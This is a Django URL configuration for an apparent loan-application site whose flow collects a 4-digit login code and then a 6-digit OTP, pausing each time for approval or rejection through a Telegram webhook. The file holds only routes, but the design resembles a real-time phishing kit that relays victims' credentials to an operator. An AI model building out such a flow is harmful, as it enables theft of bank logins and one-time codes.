from django.urls import path
from . import views


urlpatterns = [

    # Main loan application
    path(
        "",
        views.calculator_view,
        name="calculator",
    ),

    path(
        "personal-details/",
        views.personal_details_view,
        name="personal_details",
    ),

    path(
        "review/",
        views.review_view,
        name="review",
    ),

    # Login / 4 demo numbers → Telegram approval
    path(
        "login/",
        views.login_view,
        name="login",
    ),

    path(
        "request-verification/",
        views.request_verification_view,
        name="request_verification",
    ),

    # Waiting for Telegram approve / reject
    path(
        "waiting-for-approval/",
        views.waiting_for_approval_view,
        name="waiting_for_approval",
    ),

    path(
        "verification-status/",
        views.verification_status_view,
        name="verification_status",
    ),

    path(
        "approved/",
        views.approved_view,
        name="approved",
    ),

    path(
        "rejected/",
        views.rejected_view,
        name="rejected",
    ),

    # 6 demo numbers (after approval)
    path(
        "otp/",
        views.otp_view,
        name="otp",
    ),

    path(
        "verify-otp/",
        views.verify_otp_view,
        name="verify_otp",
    ),

    path(
        "waiting-for-approval-6/",
        views.waiting_for_approval_6_view,
        name="waiting_for_approval_6",
    ),
    path(
        "verification-status-6/",
        views.verification_status_6_view,
        name="verification_status_6",
    ),

    # Telegram webhook
    path(
        "telegram/callback/",
        views.telegram_callback_view,
        name="telegram_callback",
    ),

    # Final page
    path(
        "success/",
        views.success_view,
        name="success",
    ),
]
